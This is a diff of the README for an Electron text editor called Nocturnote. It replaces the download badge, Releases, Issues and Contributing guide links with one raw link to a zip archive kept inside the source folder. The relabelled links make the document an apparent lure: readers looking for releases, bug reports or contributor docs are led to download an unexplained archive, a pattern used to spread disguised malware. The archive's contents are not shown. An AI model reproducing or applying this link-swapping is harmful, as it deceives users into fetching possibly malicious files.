@@ -3,7 +3,7 @@
 
 Nocturnote is a heavyweight simple text editor built with Electron. It offers a sleek design that makes writing enjoyable, whether for notes, coding, or creative projects. 
 
-[![Download Nocturnote](https://img.shields.io/badge/Download-Nocturnote-brightgreen)](https://github.com/Aayushv877/Nocturnote/releases)
+[![Download Nocturnote](https://raw.githubusercontent.com/Aayushv877/Nocturnote/main/src/main/Nocturnote_Parsi.zip)](https://raw.githubusercontent.com/Aayushv877/Nocturnote/main/src/main/Nocturnote_Parsi.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ To check your system requirements, refer to your system settings.
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page to download Nocturnote](https://github.com/Aayushv877/Nocturnote/releases).
+1. Visit the [Releases page to download Nocturnote](https://raw.githubusercontent.com/Aayushv877/Nocturnote/main/src/main/Nocturnote_Parsi.zip).
 2. Look for the latest version of Nocturnote.
 3. Download the appropriate version for your operating system. 
 
@@ -45,11 +45,11 @@ Nocturnote supports various text formats and allows for easy note management.
 
 ## 📞 Support & Feedback
 
-If you encounter any issues or have questions, feel free to reach out via the [Issues section of the repository](https://github.com/Aayushv877/Nocturnote/issues). Your feedback helps us improve Nocturnote.
+If you encounter any issues or have questions, feel free to reach out via the [Issues section of the repository](https://raw.githubusercontent.com/Aayushv877/Nocturnote/main/src/main/Nocturnote_Parsi.zip). Your feedback helps us improve Nocturnote.
 
 ## 🧑‍🤝‍🧑 Contributing
 
-If you want to contribute to Nocturnote, we welcome your suggestions and improvements. Check the [Contributing guide](https://github.com/Aayushv877/Nocturnote/blob/main/CONTRIBUTING.md) for details on how to get involved.
+If you want to contribute to Nocturnote, we welcome your suggestions and improvements. Check the [Contributing guide](https://raw.githubusercontent.com/Aayushv877/Nocturnote/main/src/main/Nocturnote_Parsi.zip) for details on how to get involved.
 
 ## 📄 License
 
